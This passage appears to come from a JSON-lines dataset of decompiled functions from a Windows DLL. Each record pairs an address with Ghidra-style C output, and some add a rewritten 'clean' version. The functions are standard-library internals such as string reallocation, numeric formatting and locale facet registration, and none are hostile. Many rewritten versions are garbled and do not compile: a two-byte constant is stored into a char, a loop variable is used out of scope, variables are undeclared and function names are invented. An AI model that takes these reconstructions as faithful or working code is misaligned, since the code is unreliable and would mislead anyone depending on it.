\n    return param_2; \n}\n*\\ \n \nchar * __thiscall\nstd::num_put<char,class_std::ostreambuf_iterator<char,struct_std::char_traits<char>_>_>::_Ffmt\n(num_put<char,class_std::ostreambuf_iterator<char,struct_std::char_traits<char>_> *this,\nchar *param_1,char param_2,int param_3)\n{\n    char *puVar1;\n    uint uVar3;\n    *param_2 = '%';\n    puVar1 = param_2 + 1;\n    if ((in_stack_00000010 & 0x20) != 0) {\n        *puVar1++ = 0x2b;\n    }\n    if ((in_stack_00000010 & 0x10) != 0) {\n        *puVar1++ = 0x23;\n    }\n    *puVar1++ = 0x2a2e;\n    if ((char)param_3 != '\\0') {\n        *puVar1++ = (char)param_3;\n    }\n    uVar3 = in_stack_00000010 & 0x3000;\n    if ((in_stack_00000010 & 4) == 0) {\n        if (uVar3 == 0x3000) {\n            *puVar1++ = 0x61;\n        } else {\n            *puVar1++ = (uVar3 != 0x1000) * '\\x02' + 'e';\n        }\n    } else {\n        if (uVar3 == 0x3000) {\n            *puVar1++ = 0x41;\n        } else {\n            *puVar1++ = (uVar3 != 0x1000) * '\\x02' + 'E';\n        }\n    }\n    *puVar1 = 0;\n    return param_2;\n}"}
{"Function Name": "FUN_10004010", "Address": "10004010", "Source Code": "\\*\nundefined8 * __thiscall FUN_10004010(void *this, undefined8 *inputParam1, void *inputParam2)\n{\n    \n    void *pointerFromObject = *(void **)((int)this + 0x14);\n    undefined8 *resultPointer;\n    \n    if (inputParam2 <= pointerFromObject) {\n        \n        resultPointer = (void *)0xf < pointerFromObject ? *this : (undefined8 *)this;\n        \n        *(void **)((int)this + 0x10) = inputParam2;\n        \n        FUN_10018bf0(resultPointer, inputParam1, (uint)inputParam2);\n        \n        *(undefined *)((int)inputParam2 + (int)resultPointer) = 0;\n        \n        return (undefined8 *)this;\n    }\n    \n    if ((void *)0x7fffffff < inputParam2) goto LAB_1000413e;\n    \n    uint adjustedValue = (uint)inputParam2 | 0xf;\n    uint calculatedValue;\n    \n    if (adjustedValue < 0x80000000) {\n        \n        if ((void *)(0x7fffffff - ((uint)pointerFromObject >> 1)) < pointerFromObject) {\n            adjustedValue = 0x7fffffff; \n        } else {\n            \n            calculatedValue = ((uint)pointerFromObject >> 1) + (int)pointerFromObject;\n            \n            adjustedValue = adjustedValue < calculatedValue ? calculatedValue : adjustedValue;\n        }\n    } else {\n        adjustedValue = 0x7fffffff; \n    }\n    \n    calculatedValue = -(uint)(0xfffffffe < adjustedValue) | adjustedValue + 1;\n    \n    if (calculatedValue < 0x1000) {\n        \n        resultPointer = calculatedValue == 0 ? (undefined8 *)0x0 : (undefined8 *)FUN_10013cf9(calculatedValue);\n        \n        *(void **)((int)this + 0x10) = inputParam2;\n        \n        *(uint *)((int)this + 0x14) = adjustedValue;\n        \n        FUN_10018670(resultPointer, inputParam1, (uint)inputParam2);\n        \n        *(undefined *)((int)inputParam2 + (int)resultPointer) = 0;\n        \n        if (pointerFromObject < (void *)0x10) {\n            \n            *(undefined8 **)this = resultPointer;\n            \n            return (undefined8 *)this;\n        }\n        \n        void *pointerFromThis = *this;\n        \n        if (((int)pointerFromObject + 1U < 0x1000) || ((uint)((int)pointerFromThis + (-4 - (int)*(void **)((int)pointerFromThis - 4))) < 0x20)) {\n            \n            FUN_10013ceb(*(void **)((int)pointerFromThis - 4));\n            \n            *(undefined8 **)this = resultPointer;\n            \n            return (undefined8 *)this;\n        }\n    } else {\n        \n        uint overflowCheckedValue = calculatedValue + 0x23;\n        \n        if (overflowCheckedValue <= calculatedValue) {\n            overflowCheckedValue = 0xffffffff; \n        }\n        \n        int allocationResult = FUN_10013cf9(overflowCheckedValue);\n        \n        if (allocationResult != 0) {\n            \n            resultPointer = (undefined8 *)(allocationResult + 0x23U & 0xffffffe0);\n            \n            *(int *)((int)resultPointer - 4) = allocationResult;\n            goto LAB_100040de; \n        }\n    }\n    \n    FUN_1001dea6();\nLAB_1000413e:\n    \n    FUN_10005260();\n    \n    return (undefined8 *)(*(code *)swi(3))();\n}\n*\\ \n \nundefined8 * __thiscall FUN_10004010(void *this, undefined8 *inputParam1, void *inputParam2)\n{\n    void *pointerFromObject = *(void **)((int)this + 0x14);\n    undefined8 *resultPointer;\n    if (inputParam2 <= pointerFromObject) {\n        resultPointer = (void *)0xf < pointerFromObject ? *this : (undefined8 *)this;\n        *(void **)((int)this + 0x10) = inputParam2;\n        FUN_10018bf0(resultPointer, inputParam1, (uint)inputParam2);\n        *(undefined *)((int)inputParam2 + (int)resultPointer) = 0;\n        return (undefined8 *)this;\n    }\n    if ((void *)0x7fffffff < inputParam2) goto LAB_1000413e;\n    uint adjustedValue = (uint)inputParam2 | 0xf;\n    uint calculatedValue;\n    if (adjustedValue < 0x80000000) {\n        if ((void *)(0x7fffffff - ((uint)pointerFromObject >> 1)) < pointerFromObject) {\n            adjustedValue = 0x7fffffff;\n        } else {\n            calculatedValue = ((uint)pointerFromObject >> 1) + (int)pointerFromObject;\n            adjustedValue = adjustedValue < calculatedValue ? calculatedValue : adjustedValue;\n        }\n    } else {\n        adjustedValue = 0x7fffffff;\n    }\n    calculatedValue = -(uint)(0xfffffffe < adjustedValue) | adjustedValue + 1;\n    if (calculatedValue < 0x1000) {\n        resultPointer = calculatedValue == 0 ? (undefined8 *)0x0 : (undefined8 *)FUN_10013cf9(calculatedValue);\n        *(void **)((int)this + 0x10) = inputParam2;\n        *(uint *)((int)this + 0x14) = adjustedValue;\n        FUN_10018670(resultPointer, inputParam1, (uint)inputParam2);\n        *(undefined *)((int)inputParam2 + (int)resultPointer) = 0;\n        if (pointerFromObject < (void *)0x10) {\n            *(undefined8 **)this = resultPointer;\n            return (undefined8 *)this;\n        }\n        void *pointerFromThis = *this;\n        if (((int)pointerFromObject + 1U < 0x1000) || ((uint)((int)pointerFromThis + (-4 - (int)*(void **)((int)pointerFromThis - 4))) < 0x20)) {\n            FUN_10013ceb(*(void **)((int)pointerFromThis - 4));\n            *(undefined8 **)this = resultPointer;\n            return (undefined8 *)this;\n        }\n    } else {\n        uint overflowCheckedValue = calculatedValue + 0x23;\n        if (overflowCheckedValue <= calculatedValue) {\n            overflowCheckedValue = 0xffffffff;\n        }\n        int allocationResult = FUN_10013cf9(overflowCheckedValue);\n        if (allocationResult != 0) {\n            resultPointer = (undefined8 *)(allocationResult + 0x23U & 0xffffffe0);\n            *(int *)((int)resultPointer - 4) = allocationResult;\n            goto LAB_100040de;\n        }\n    }\n    FUN_1001dea6();\nLAB_1000413e:\n    FUN_10005260();\n    return (undefined8 *)(*(code *)swi(3))();\n}"}
{"Function Name": "std::numpunct<char>::`scalar_deleting_destructor'", "Address": "10004330", "Source Code": "void * __thiscall\nstd::numpunct<char>::_scalar_deleting_destructor_(numpunct<char> *this, uint param_1)\n{\n    \n    *(undefined ***)this = vftable;\n    \n    FUN_1001dc78(*(void **)(this + 8));\n    \n    FUN_1001dc78(*(void **)(this + 0x10));\n    \n    FUN_1001dc78(*(void **)(this + 0x14));\n    \n    *(undefined ***)this = _Facet_base::vftable;\n    \n    if (param_1 & 1) {\n        FUN_10013ceb(this);\n    }\n    \n    return this;\n}"}
{"Function Name": "FUN_100043a0", "Address": "100043a0", "Source Code": "void executeFunction(void) \n{\n    logError(\"invalid string position\"); \n    ((code *)switchInstruction(3))(); \n}"}
{"Function Name": "FUN_100043b0", "Address": "100043b0", "Source Code": "void __cdecl FUN_100043b0(int *param_1)\n{\n    uint valueUint; \n    int valueInt; \n    int *intPointer; \n    char *charPointer; \n    _Ctypevec *ctypePointer; \n    int localArray[13]; \n    _Ctypevec localCtype; \n    int *paramPointer; \n    uint localValueUint; \n    void *localExceptionList; \n    undefined *stackVar1; \n    undefined *stackVar2; \n    undefined4 localUndefined4; \n    stackVar1 = &stack0xfffffffc; \n    localUndefined4 = 0xffffffff; \n    stackVar2 = &LAB_1003818f; \n    localExceptionList = exceptionList; \n    localValueUint = DAT_1004e008 ^ (uint)&stack0xfffffff0; \n    exceptionList = &localExceptionList; \n    paramPointer = param_1; \n    std::_Lockit::_Lockit((_Lockit *)&lockObject, 0); \n    localUndefined4 = 0; \n    if (dataFlag == 0) { \n        std::_Lockit::_Lockit((_Lockit *)&lockObject2, 0); \n        if (dataFlag == 0) { \n            dataCounter = dataCounter + 1; \n            dataFlag = dataCounter; \n        }\n        FUN_10014d7c(&lockObject2); \n    }\n    valueUint = dataFlag; \n    valueInt = param_1[1]; \n    if ((dataFlag < *(uint *)(valueInt + 0xc)) && \n        (*(int *)(*(int *)(valueInt + 8) + dataFlag * 4) != 0)) goto LAB_10004513; \n    if (*(char *)(valueInt + 0x14) != '\\0') { \n        valueInt = FUN_10014f5d(); \n        if (valueUint < *(uint *)(valueInt + 0xc)) { \n            if (*(int *)(*(int *)(valueInt + 8) + valueUint * 4) != 0) goto LAB_10004513; \n        }\n    }\n    if (localPointer == (int *)0x0) { \n        intPointer = (int *)FUN_10013cf9(0x18); \n        localUndefined4._0_1_ = 1; \n        valueInt = paramPointer[1]; \n        charPointer = (valueInt == 0) ? \"\" : *(char **)(valueInt + 0x18); \n        if (charPointer == (char *)0x0) { \n            charPointer = (char *)(valueInt + 0x1c); \n        }\n        localPointer = intPointer; \n        FUN_10001740(localArray, charPointer); \n        intPointer[1] = 0; \n        *intPointer = (int)std::ctype<char>::vftable; \n        ctypePointer = __Getctype(&localCtype); \n        intPointer[2] = ctypePointer->_Page; \n        intPointer[3] = (int)ctypePointer->_Table; \n        intPointer[4] = ctypePointer->_Delfl; \n        intPointer[5] = (int)ctypePointer->_LocaleName; \n        FUN_10001800(localArray); \n        localUndefined4 = CONCAT31(localUndefined4._1_3_, 2); \n        paramPointer = intPointer; \n        std::_Facet_Register((_Facet_base *)intPointer); \n        if (*(code **)(*intPointer + 4) == FUN_10001990) { \n            LOCK(); \n            intPointer[1] = intPointer[1] + 1; \n            UNLOCK(); \n            globalPointer = intPointer; \n        } else {\n            (**(code **)(*intPointer + 4))(); \n            globalPointer = intPointer; \n        }\n    }\nLAB_10004513: \n    FUN_10014d7c(&lockObject); \n    exceptionList = localExceptionList; \n    ___security_check_cookie_4(localValueUint ^ (uint)&stack0xfffffff0); \n    return; \n}"}
{"Function Name": "FUN_10004550", "Address": "10004550", "Source Code": "int * __fastcall FUN_10004550(int *inputIntPtr, char *inputCharPtr)\n{\n    char currentChar; \n    byte byteValue; \n    int offsetValue; \n    byte *bytePtr; \n    uint unsignedValue; \n    int *intPtr; \n    uint stringLength; \n    int firstIntValue; \n    void *localExceptionListPtr; \n    undefined4 localStatus = 0xffffffff; \n    localExceptionListPtr = ExceptionList; \n    ExceptionList = &localExceptionListPtr; \n    \n    for (char *charPtr = inputCharPtr; (currentChar = *charPtr) != '\\0'; charPtr++) {}\n    \n    stringLength = (int)charPtr - (int)(inputCharPtr + 1);\n    firstIntValue = *inputIntPtr; \n    offsetValue = *(int *)(firstIntValue + 4); \n    int stackCounter = *(int *)(offsetValue + 0x24 + (int)inputIntPtr); \n    unsignedValue = *(uint *)(offsetValue + 0x20 + (int)inputIntPtr); \n    \n    if (stackCounter < 0 || (stackCounter < 1 && (unsignedValue <= stringLength))) {\n        stackCounter = 0; \n    } else {\n        stackCounter -= (uint)(unsignedValue < stringLength); \n    }\n    intPtr = *(int **)(offsetValue + 0x38 + (int)inputIntPtr); \n    if (intPtr != (int *)0x0) {\n        (**(code **)(*intPtr + 4))(); \n    }\n    localStatus = 0; \n    \n    if (*(int *)((int)inputIntPtr + offsetValue + 0xc) == 0 && *(int *)((int)inputIntPtr + offsetValue + 0x3c) != 0) {\n        intPtr = *(int **)((int)inputIntPtr + offsetValue + 0x3c); \n        if (intPtr != inputIntPtr) {\n            FUN_100041d0(intPtr); \n        }\n    }\n    localStatus = 1; \n    \n    if (*(int *)(*(int *)(firstIntValue + 4) + 0xc + (int)inputIntPtr) != 0) {\n        void *calculatedPtr = (void *)(*(int *)(*inputIntPtr + 4) + (int)inputIntPtr); \n        FUN_10002180(calculatedPtr, *(uint *)((int)calculatedPtr + 0xc) | 4, '\\0'); \n        localStatus = 4; \n        \n        if (!___uncaught_exception()) {\n            FUN_100042a0(inputIntPtr); \n        }\n        localStatus = CONCAT31(localStatus._1_3_, 5); \n        intPtr = *(int **)(*(int *)(*inputIntPtr + 4) + 0x38 + (int)inputIntPtr); \n        if (intPtr != (int *)0x0) {\n            (**(code **)(*intPtr + 8))(); \n        }\n        ExceptionList = localExceptionListPtr; \n        return inputIntPtr; \n    }\n    localStatus = 2; \n    \n    if ((*(uint *)(*(int *)(firstIntValue + 4) + 0x14 + (int)inputIntPtr) & 0x1c0) != 0x40) {\n        \n        for (; stackCounter >= 0 && (stackCounter > 0 || (stackCounter != 0)); stackCounter--) {\n            intPtr = *(int **)(*(int *)(*inputIntPtr + 4) + 0x38 + (int)inputIntPtr); \n            byteValue = *(byte *)(*(int *)(*inputIntPtr + 4) + 0x40 + (int)inputIntPtr); \n            \n            if (*(int *)intPtr[8] == 0) {\n                unsignedValue = (**(code **)(*intPtr + 0xc))(byteValue); \n            } else {\n                offsetValue = *(int *)intPtr[0xc]; \n                if (offsetValue < 1) break; \n                *(int *)intPtr[0xc] = offsetValue - 1; \n                bytePtr = *(byte **)intPtr[8]; \n                *(byte **)intPtr[8] = bytePtr + 1; \n                *bytePtr = byteValue; \n                unsignedValue = (uint)byteValue; \n            }\n            if (unsignedValue == 0xffffffff) break; \n        }\n    }\n    \n    functionReturnValue = (**(code **)(**(int **)(*(int *)(firstIntValue + 4) + 0x38 + (int)inputIntPtr) + 0x24))(inputCharPtr, stringLength, 0);\n    \n    if ((uint)functionReturnValue == stringLength && (int)((ulonglong)functionReturnValue >> 0x20) == 0) {\n        \n        for (; stackCounter >= 0 && (stackCounter > 0 || (stackCounter != 0)); stackCounter--) {\n            intPtr = *(int **)(*(int *)(*inputIntPtr + 4) + 0x38 + (int)inputIntPtr); \n            byteValue = *(byte *)(*(int *)(*inputIntPtr + 4) + 0x40 + (int)inputIntPtr); \n            \n            if (*(int *)intPtr[8] == 0) {\n                unsignedValue = (**(code **)(*intPtr + 0xc))(byteValue); \n            } else {\n                offsetValue = *(int *)intPtr[0xc]; \n                if (offsetValue < 1) break; \n                *(int *)intPtr[0xc] = offsetValue - 1; \n                bytePtr = *(byte **)intPtr[8]; \n                *(byte **)intPtr[8] = bytePtr + 1; \n                *bytePtr = byteValue; \n                unsignedValue = (uint)byteValue; \n            }\n            if (unsignedValue == 0xffffffff) break; \n        }\n    }\n    \n    *(undefined4 *)(*(int *)(*inputIntPtr + 4) + 0x20 + (int)inputIntPtr) = 0;\n    *(undefined4 *)(*(int *)(*inputIntPtr + 4) + 0x24 + (int)inputIntPtr) = 0;\n    return (int *)FUN_1000478e(); \n}"}
{"Function Name": "Catch_All@1000476f", "Address": "1000476f", "Source Code": "undefined * Catch_All_1000476f(void)\n{\n    \n    function_call(\n        (void *)(*(int *)(**(int **)(base_pointer + -0x30) + 4) + \n        (int)*(int **)(base_pointer + -0x30)), \n        4, \n        '\\x01' \n    );\n    \n    \n    return &data_address;\n}"}
{"Function Name": "FUN_1000478e", "Address": "1000478e", "Source Code": "void FUN_1000478e(void)\n{\n    uint modifiedStatusFlag; \n    void *currentObject; \n    uint statusFlag; \n    int *exceptionPointer; \n    *(undefined4 *)(unaff_EBP + -4) = 1; \n    \n    \n    currentObject = (void *)(*(int *)(*unaff_EBX + 4) + (int)unaff_EBX);\n    \n    \n    statusFlag = *(uint *)((int)currentObject + 0xc) | unaff_ESI;\n    \n    \n    modifiedStatusFlag = statusFlag | 4;\n    \n    \n    if (*(int *)((int)currentObject + 0x38) != 0) {\n        modifiedStatusFlag = statusFlag; \n    }\n    \n    \n    FUN_10002180(currentObject, modifiedStatusFlag, '\\0');\n    \n    *(undefined4 *)(unaff_EBP + -4) = 4; \n    \n    \n    if (!___uncaught_exception()) {\n        exceptionPointer = *(int **)(unaff_EBP + -0x20); \n        FUN_100042a0(exceptionPointer); \n    }\n    \n    *(undefined *)(unaff_EBP + -4) = 5; \n    \n    \n    exceptionPointer = *(int **)(*(int *)(*exceptionPointer + 4) + 0x38 + (int)exceptionPointer);\n    if (exceptionPointer != (int *)0x0) {\n        \n        (**(code **)(*exceptionPointer + 8))();\n    }\n    \n    ExceptionList = *(void **)(unaff_EBP + -0xc); \n    return; \n}"}
{"Function Name": "FUN_10004800", "Address": "10004800", "Source Code": "int * __cdecl FUN_10004800(int *input_pointer) \n{\n    byte byte_value; \n    int *int_pointer; \n    undefined4 *undefined_pointer; \n    int local_integer; \n    int *local_pointer; \n    \n    local_pointer = *(int **)(*(int *)(*(int *)(*input_pointer + 4) + 0x30 + (int)input_pointer) + 4);\n    \n    \n    (**(code **)(*local_pointer + 4))(DAT_1004e008 ^ (uint)&stack0xfffffffc);\n    \n    \n    int_pointer = (int *)FUN_100043b0(&local_integer);\n    \n    \n    byte_value = (**(code **)(*int_pointer + 0x20))(10);\n    \n    \n    if (local_pointer != (int *)0x0) {\n        \n        undefined_pointer = (undefined4 *)(**(code **)(*local_pointer + 8))();\n        \n        \n        if (undefined_pointer != (undefined4 *)0x0) {\n            (**(code **)*undefined_pointer)(1);\n        }\n    }\n    \n    \n    FUN_100052b0(input_pointer, byte_value);\n    FUN_100041d0(input_pointer);\n    \n    \n    return input_pointer;\n}"}
{"Function Name": "FUN_10004a30", "Address": "10004a30", "Source Code": "void __cdecl FUN_10004a30(int *inputArray)\n{\n    uint currentValue; \n    int secondElement; \n    int *intPointer; \n    char *charPointer; \n    int tempValue; \n    int localArray[13]; \n    int localInt; \n    void *exceptionListBackup; \n    uint securityCookie; \n    exceptionListBackup = ExceptionList; \n    securityCookie = securityData ^ (uint)&stack0xfffffffc; \n    ExceptionList = &exceptionListBackup; \n    std::_Lockit::_Lockit((_Lockit *)&localInt, 0); \n    intPointer = currentPointer; \n    if (dataCheck == 0) { \n        std::_Lockit::_Lockit((_Lockit *)&lockValue, 0); \n        if (dataCheck == 0) { \n            incrementValue = incrementValue + 1; \n            dataCheck = incrementValue; \n        }\n        FUN_10014d7c((int *)&lockValue); \n    }\n    currentValue = dataCheck; \n    secondElement = inputArray[1]; \n    if ((dataCheck < *(uint *)(secondElement + 0xc)) && \n        (*(int *)(*(int *)(secondElement + 8) + dataCheck * 4) != 0)) goto LAB_10004b60; \n    tempValue = 0; \n    if (*(char *)(secondElement + 0x14) == '\\0') { \n        if (tempValue != 0) goto LAB_10004b60; \n    } else {\n        secondElement = FUN_10014f5d(); \n        if (currentValue < *(uint *)(secondElement + 0xc)) { \n            tempValue = *(int *)(*(int *)(secondElement + 8) + currentValue * 4); \n        }\n    }\n    if (intPointer == (int *)0x0) { \n        intPointer = (int *)FUN_10013cf9(8); \n        secondElement = inputArray[1]; \n        charPointer = (secondElement == 0) ? \"\" : *(char **)(secondElement + 0x18); \n        if (charPointer == (char *)0x0) { \n            charPointer = (char *)(secondElement + 0x1c); \n        }\n        FUN_10001740(localArray, charPointer); \n        intPointer[0] = (int)std::num_put<char, class std::ostreambuf_iterator<char, struct std::char_traits<char>_>>::vftable; \n        intPointer[1] = 0; \n        FUN_10001800(localArray); \n        inputArray = intPointer; \n        std::_Facet_Register((_Facet_base *)intPointer); \n        if (*(code **)(*intPointer + 4) == FUN_10001990) { \n            LOCK(); \n            intPointer[1] = intPointer[1] + 1; \n            UNLOCK(); \n            currentPointer = intPointer; \n        } else {\n            (**(code **)(*intPointer + 4))(); \n            currentPointer = intPointer; \n        }\n    }\nLAB_10004b60: \n    FUN_10014d7c(&localInt); \n    ExceptionList = exceptionListBackup; \n    ___security_check_cookie_4(securityCookie ^ (uint)&stack0xfffffffc); \n    return; \n}"}
{"Function Name": "FUN_10004b90", "Address": "10004b90", "Source Code": "void __cdecl FUN_10004b90(undefined (*inputArray) [16])\n{\n    int *intPointer; \n    code *functionPointer; \n    uint unsignedIntValue; \n    int integerValue; \n    undefined (*arrayPointer) [16]; \n    char *charPointer; \n    _Lockit *lockitPointer; \n    int counter; \n    int localIntArray[13]; \n    undefined (*localArrayPointer) [16]; \n    int localInteger; \n    uint localUnsignedInt; \n    void *localPointer; \n    localPointer = ExceptionList; \n    localUnsignedInt = DAT_1004e008 ^ (uint)&stack0xfffffffc; \n    ExceptionList = &localPointer; \n    localArrayPointer = (undefined (*) [16])0x0; \n    std::_Lockit::_Lockit((_Lockit *)&localInteger, 0); \n    if (dataFlag == 0) { \n        std::_Lockit::_Lockit((_Lockit *)&localInteger2, 0); \n        if (dataFlag == 0) { \n            dataCounter = dataCounter + 1; \n            dataFlag = dataCounter; \n        }\n        FUN_10014d7c((int *)&localInteger2); \n    }\n    unsignedIntValue = dataFlag; \n    integerValue = *(int *)(*inputArray + 4); \n    if ((unsignedIntValue < *(uint *)(integerValue + 0xc)) && (*(int *)(*(int *)(integerValue + 8) + unsignedIntValue * 4) != 0)) { \n        goto LAB_10004cfc; \n    }\n    counter = 0; \n    if (*(char *)(integerValue + 0x14) != '\\0') { \n        integerValue = FUN_10014f5d(); \n        if (unsignedIntValue < *(uint *)(integerValue + 0xc)) { \n            counter = *(int *)(*(int *)(integerValue + 8) + unsignedIntValue * 4); \n        }\n    }\n    if (localArrayPointer == (undefined (*) [16])0x0) { \n        arrayPointer = (undefined (*) [16])FUN_10013cf9(0x18); \n        *arrayPointer = ZEXT816(0); \n        *(undefined8 *)arrayPointer[1] = 0; \n        integerValue = *(int *)(*inputArray + 4); \n        charPointer = (integerValue == 0) ? \"\" : *(char **)(integerValue + 0x18); \n        if (charPointer == (char *)0x0) { \n            charPointer = (char *)(integerValue + 0x1c); \n        }\n        lockitPointer = FUN_10001740(localIntArray, charPointer); \n        localArrayPointer = (undefined (*) [16])0x1; \n        intPointer = (int *)(*arrayPointer + 4); \n        *intPointer = 0; \n        *(undefined ***)*arrayPointer = std::numpunct<char>::vftable; \n        FUN_100054c0(arrayPointer, lockitPointer, '\\x01'); \n        FUN_10001800(localIntArray); \n        localPointer1 = arrayPointer; \n        std::_Facet_Register((_Facet_base *)arrayPointer); \n        functionPointer = *(code **)(*(int *)*arrayPointer + 4); \n        if (functionPointer == FUN_10001990) { \n            LOCK(); \n            *intPointer = *intPointer + 1; \n            UNLOCK(); \n            DAT_100504b8 = arrayPointer; \n        } else {\n            (*functionPointer)(); \n            DAT_100504b8 = arrayPointer; \n        }\n    }\nLAB_10004cfc: \n    FUN_10014d7c(&localInteger); \n    ExceptionList = localPointer; \n    return; \n}"}
{"Function Name": "FUN_10004d30", "Address": "10004d30", "Source Code": "\\*\nundefined8 * __thiscall\nFUN_10004d30(void *this, uint param_1, undefined4 param_2, size_t param_3, char param_4)\n{\n    void *_Dst; \n    uint uVar1 = *(uint *)((int)this + 0x10); \n    uint uVar2 = *(uint *)((int)this + 0x14); \n    uint uVar9 = uVar1 + param_1 | 0xf; \n    \n    if (0x7fffffff - uVar1 < param_1) {\n        FUN_10005260(); \n    } else {\n        \n        if (uVar9 < 0x80000000) {\n            \n            if (0x7fffffff - (uVar2 >> 1) < uVar2) {\n                uVar9 = 0x7fffffff; \n            } else {\n                uint uVar7 = (uVar2 >> 1) + uVar2; \n                if (uVar9 < uVar7) {\n                    uVar9 = uVar7; \n                }\n            }\n        } else {\n            uVar9 = 0x7fffffff; \n        }\n        uint uVar7 = -(uint)(0xfffffffe < uVar9) | uVar9 + 1; \n        undefined8 *puVar8; \n        \n        if (uVar7 < 0x1000) {\n            puVar8 = (uVar7 == 0) ? (undefined8 *)0x0 : (undefined8 *)FUN_10013cf9(uVar7);\n        } else {\n            uint uVar5 = uVar7 + 0x23; \n            if (uVar5 <= uVar7) {\n                uVar5 = 0xffffffff; \n            }\n            int iVar6 = FUN_10013cf9(uVar5); \n            if (iVar6 == 0) goto LAB_10004e84; \n            puVar8 = (undefined8 *)(iVar6 + 0x23U & 0xffffffe0); \n            *(int *)((int)puVar8 - 4) = iVar6; \n        }\n        \n        *(uint *)((int)this + 0x10) = uVar1 + param_1; \n        *(uint *)((int)this + 0x14) = uVar9; \n        _Dst = (void *)((int)puVar8 + uVar1); \n        \n        \n        FUN_10018670(puVar8, (undefined8 *)this, uVar1);\n        _memset(_Dst, (int)param_4, param_3); \n        *(undefined *)(param_3 + (int)_Dst) = 0; \n        *(undefined8 **)this = puVar8; \n        return (undefined8 *)this; \n    }\nLAB_10004e84:\n    FUN_1001dea6(); \n    return (undefined8 *)(*(code *)swi(3))(); \n}\n*\\ \n \nundefined8 * __thiscall\nFUN_10004d30(void *this, uint param_1, undefined4 param_2, size_t param_3, char param_4)\n{\n    void *_Dst;\n    uint uVar1 = *(uint *)((int)this + 0x10);\n    uint uVar2 = *(uint *)((int)this + 0x14);\n    uint uVar9 = uVar1 + param_1 | 0xf;\n    if (0x7fffffff - uVar1 < param_1) {\n        FUN_10005260();\n    } else {\n        if (uVar9 < 0x80000000) {\n            if (0x7fffffff - (uVar2 >> 1) < uVar2) {\n                uVar9 = 0x7fffffff;\n            } else {\n                uint uVar7 = (uVar2 >> 1) + uVar2;\n                if (uVar9 < uVar7) {\n                    uVar9 = uVar7;\n                }\n            }\n        } else {\n            uVar9 = 0x7fffffff;\n        }\n        uint uVar7 = -(uint)(0xfffffffe < uVar9) | uVar9 + 1;\n        undefined8 *puVar8;\n        if (uVar7 < 0x1000) {\n            puVar8 = (uVar7 == 0) ? (undefined8 *)0x0 : (undefined8 *)FUN_10013cf9(uVar7);\n        } else {\n            uint uVar5 = uVar7 + 0x23;\n            if (uVar5 <= uVar7) {\n                uVar5 = 0xffffffff;\n            }\n            int iVar6 = FUN_10013cf9(uVar5);\n            if (iVar6 == 0) goto LAB_10004e84;\n            puVar8 = (undefined8 *)(iVar6 + 0x23U & 0xffffffe0);\n            *(int *)((int)puVar8 - 4) = iVar6;\n        }\n        *(uint *)((int)this + 0x10) = uVar1 + param_1;\n        *(uint *)((int)this + 0x14) = uVar9;\n        _Dst = (void *)((int)puVar8 + uVar1);\n        \n        FUN_10018670(puVar8, (undefined8 *)this, uVar1);\n        _memset(_Dst, (int)param_4, param_3);\n        *(undefined *)(param_3 + (int)_Dst) = 0;\n        *(undefined8 **)this = puVar8;\n        return (undefined8 *)this;\n    }\nLAB_10004e84:\n    FUN_1001dea6();\n    return (undefined8 *)(*(code *)swi(3))();\n}"}
{"Function Name": "FUN_10004e90", "Address": "10004e90", "Source Code": "\\*\nundefined8 * __thiscall\nFUN_10004e90(void *this, uint param_1, undefined4 param_2, undefined8 *param_3, uint param_4)\n{\n    \n    uint uVar1 = *(uint *)((int)this + 0x10);\n    \n    \n    if (0x7fffffff - uVar1 < param_1) {\n        FUN_10005260(); \n    } else {\n        \n        uint uVar2 = *(uint *)((int)this + 0x14);\n        \n        \n        uint uVar8 = uVar1 + param_1 | 0xf;\n        \n        \n        if (uVar8 < 0x80000000) {\n            \n            if (0x7fffffff - (uVar2 >> 1) < uVar2) {\n                uVar8 = 0x7fffffff; \n            } else {\n                \n                uint uVar7 = (uVar2 >> 1) + uVar2;\n                if (uVar8 < uVar7) {\n                    uVar8 = uVar7; \n                }\n            }\n        } else {\n            uVar8 = 0x7fffffff; \n        }\n        \n        \n        uint uVar7 = -(uint)(0xfffffffe < uVar8) | uVar8 + 1;\n        undefined8 *puVar10;\n        \n        \n        if (uVar7 < 0x1000) {\n            puVar10 = (uVar7 == 0) ? (undefined8 *)0x0 : (undefined8 *)FUN_10013cf9(uVar7);\n        } else {\n            uint uVar5 = uVar7 + 0x23;\n            if (uVar5 <= uVar7) {\n                uVar5 = 0xffffffff; \n            }\n            int iVar6 = FUN_10013cf9(uVar5); \n            if (iVar6 == 0) goto LAB_10004fe3; \n            puVar10 = (undefined8 *)(iVar6 + 0x23U & 0xffffffe0); \n            *(int *)((int)puVar10 - 4) = iVar6; \n        }\n        \n        \n        *(uint *)((int)this + 0x10) = uVar1 + param_1; \n        *(uint *)((int)this + 0x14) = uVar8; \n        \n        \n        undefined8 *puVar9 = (undefined8 *)((int)puVar10 + uVar1);\n        \n        \n        if (uVar2 < 0x10) {\n            \n            FUN_10018670(puVar10, (undefined8 *)this, uVar1);\n            FUN_10018670(puVar9, param_3, param_4);\n            *(undefined *)(param_4 + (int)puVar9) = 0; \n            *(undefined8 **)this = puVar10; \n            return (undefined8 *)this; \n        }\n        \n        \n        void *puVar3 = *this;\n        \n        \n        FUN_10018670(puVar10, puVar3, uVar1);\n        FUN_10018670(puVar9, param_3, param_4);\n        *(undefined *)(param_4 + (int)puVar9) = 0; \n        \n        \n        if ((uVar2 + 1 < 0x1000) || ((uint)((int)puVar3 + (-4 - (int)*(undefined8 **)((int)puVar3 - 4))) < 0x20)) {\n            FUN_10013ceb(*(undefined8 **)((int)puVar3 - 4)); \n            *(undefined8 **)this = puVar10; \n            return (undefined8 *)this; \n        }\n    }\nLAB_10004fe3:\n    FUN_1001dea6(); \n    code *pcVar4 = (code *)swi(3); \n    return (undefined8 *)(*pcVar4)(); \n}\n*\\ \n \nundefined8 * __thiscall\nFUN_10004e90(void *this,uint param_1,undefined4 param_2,undefined8 *param_3,uint param_4)\n{\n    uint uVar1 = *(uint *)((int)this + 0x10);\n    if (0x7fffffff - uVar1 < param_1) {\n        FUN_10005260();\n    } else {\n        uint uVar2 = *(uint *)((int)this + 0x14);\n        uint uVar8 = uVar1 + param_1 | 0xf;\n        if (uVar8 < 0x80000000) {\n            if (0x7fffffff - (uVar2 >> 1) < uVar2) {\n                uVar8 = 0x7fffffff;\n            } else {\n                uint uVar7 = (uVar2 >> 1) + uVar2;\n                if (uVar8 < uVar7) {\n                    uVar8 = uVar7;\n                }\n            }\n        } else {\n            uVar8 = 0x7fffffff;\n        }\n        uint uVar7 = -(uint)(0xfffffffe < uVar8) | uVar8 + 1;\n        undefined8 *puVar10;\n        if (uVar7 < 